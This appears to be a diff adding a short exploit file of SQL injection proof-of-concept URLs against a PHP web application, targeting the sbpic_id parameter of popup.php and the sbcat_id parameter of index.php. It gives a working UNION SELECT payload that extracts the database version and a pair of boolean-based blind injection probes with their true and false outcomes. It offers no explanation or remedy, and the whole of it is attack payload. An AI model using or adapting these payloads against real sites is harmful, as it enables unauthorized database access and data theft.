@@ -1,0 +1,8 @@
+http://www.example.com/[path]/popup.php?sbpic_id=[SQLi]
+http://www.example.com/[path]/popup.php?sbpic_id=-9999+union+all+select+1,2,3,version(),5,6,7,8,9,10,11--
+
+
+http://www.example.com/[path]/index.php?sbcat_id=[Blind SQLi]
+http://www.example.com/[path]/index.php?sbcat_id=6+and+substring(version(),1,1)=5  &lt;&lt; true
+http://www.example.com/[path]/index.php?sbcat_id=6+and+substring(version(),1,1)=4  &lt;&lt; false
+
